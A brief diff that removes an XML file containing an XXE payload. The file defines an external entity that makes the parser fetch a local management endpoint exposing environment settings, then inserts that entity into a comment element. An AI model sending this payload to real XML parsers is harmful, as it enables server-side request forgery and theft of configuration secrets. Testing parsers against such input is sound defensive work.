@@ -1,6 +1,0 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE comments[
-    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/management/env" >]>
-<comments>
-<comment>&xxe;</comment>
-</comments>
